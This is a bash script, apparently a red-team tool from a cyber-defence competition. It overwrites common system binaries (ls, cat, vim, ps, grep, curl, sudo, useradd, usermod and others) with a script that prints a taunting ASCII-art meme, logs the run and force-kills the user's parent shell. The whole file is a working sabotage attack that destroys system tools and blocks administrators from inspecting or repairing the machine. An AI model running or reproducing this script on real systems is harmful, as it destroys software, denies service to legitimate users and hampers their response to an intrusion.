#!/usr/bin/bash


function megamind {
	echo "-------------------------------------------"

	echo "" > $1
	echo '#!/usr/bin/bash' >> $1
	echo 'sleep 0' >> $1
	echo 'echo ⣞⢽⢪⢣⢣⢣⢫⡺⡵⣝⡮⣗⢷⢽⢽⢽⣮⡷⡽⣜⣜⢮⢺⣜⢷⢽⢝⡽⣝' >> $1
	echo 'echo ⠸⡸⠜⠕⠕⠁⢁⢇⢏⢽⢺⣪⡳⡝⣎⣏⢯⢞⡿⣟⣷⣳⢯⡷⣽⢽⢯⣳⣫⠇' >> $1
	echo 'echo ⠀⠀⢀⢀⢄⢬⢪⡪⡎⣆⡈⠚⠜⠕⠇⠗⠝⢕⢯⢫⣞⣯⣿⣻⡽⣏⢗⣗⠏⠀' >> $1
	echo 'echo ⠀⠪⡪⡪⣪⢪⢺⢸⢢⢓⢆⢤⢀⠀⠀⠀⠀⠈⢊⢞⡾⣿⡯⣏⢮⠷⠁⠀⠀' >> $1
	echo 'echo ⠀⠀⠀⠈⠊⠆⡃⠕⢕⢇⢇⢇⢇⢇⢏⢎⢎⢆⢄⠀⢑⣽⣿⢝⠲⠉⠀⠀⠀⠀' >> $1
	echo 'echo ⠀⠀⠀⠀⠀⡿⠂⠠⠀⡇⢇⠕⢈⣀⠀⠁⠡⠣⡣⡫⣂⣿⠯⢪⠰⠂⠀⠀⠀⠀' >> $1
	echo 'echo ⠀⠀⠀⠀⡦⡙⡂⢀⢤⢣⠣⡈⣾⡃⠠⠄⠀⡄⢱⣌⣶⢏⢊⠂⠀⠀⠀⠀⠀⠀' >> $1
	echo 'echo ⠀⠀⠀⠀⢝⡲⣜⡮⡏⢎⢌⢂⠙⠢⠐⢀⢘⢵⣽⣿⡿⠁⠁⠀⠀⠀⠀⠀⠀⠀' >> $1
	echo 'echo ⠀⠀⠀⠀⠨⣺⡺⡕⡕⡱⡑⡆⡕⡅⡕⡜⡼⢽⡻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀' >> $1
	echo 'echo ⠀⠀⠀⠀⣼⣳⣫⣾⣵⣗⡵⡱⡡⢣⢑⢕⢜⢕⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀' >> $1
	echo 'echo ⠀⠀⠀⣴⣿⣾⣿⣿⣿⡿⡽⡑⢌⠪⡢⡣⣣⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀' >> $1
	echo 'echo ⠀⠀⠀⡟⡾⣿⢿⢿⢵⣽⣾⣼⣘⢸⢸⣞⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀' >> $1
	echo 'echo ⠀⠀⠀⠀⠁⠇⠡⠩⡫⢿⣝⡻⡮⣒⢽⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀' >> $1
	echo 'echo ""' >> $1
	echo 'echo no persistence??' >> $1
	echo 'echo ""' >> $1
	echo '# team10' >> $1
	
	echo "echo \"\$date Someone ran $1\" >> /var/log/adversary.log" >> $1
	
	echo "sleep 1" >> $1
	#echo 'echo $PPID' >> $1
	echo 'kill -9 $PPID' >> $1
	echo 'kill -9 $(pgrep -P $PPID)' >> $1

	chmod +x $1
}

function delete {
    local cmd="$1"
    local which_output
    local already_copied

    which_output=$(command -v "$cmd" 2>/dev/null)
    echo "Resolved path: $which_output"

    already_copied=$(ls -lahF "$target_path" 2>/dev/null | grep -F "$cmd" | wc -l)
    echo "Already copied for $cmd: $already_copied"

    # Case 1: command not found
    if [[ -z "$which_output" ]]; then
        echo "Command $cmd not found"
        megamind "/usr/bin/$cmd"
        return
    fi

    # Case 2: found, but not yet copied
    if [[ "$already_copied" -eq 0 ]]; then
        echo "Command $cmd was found not in target path"
        megamind "$which_output"
        megamind "/usr/bin/$cmd"
        return
    fi

    # Case 3: already in target path
    echo "Command $cmd was found in target path"
    megamind "/usr/bin/$cmd"
}


delete ls
delete vim
delete cat
delete vi
delete nano
delete find
delete grep
delete ps
delete top
delete whoami
delete id
delete wget
delete curl
delete awk
delete mkdir
delete rmdir
delete nmap

delete useradd
delete adduser
delete userdel
delete deluser
delete groupadd
delete addgroup
delete groupdel
delete delgroup
delete usermod
delete sudo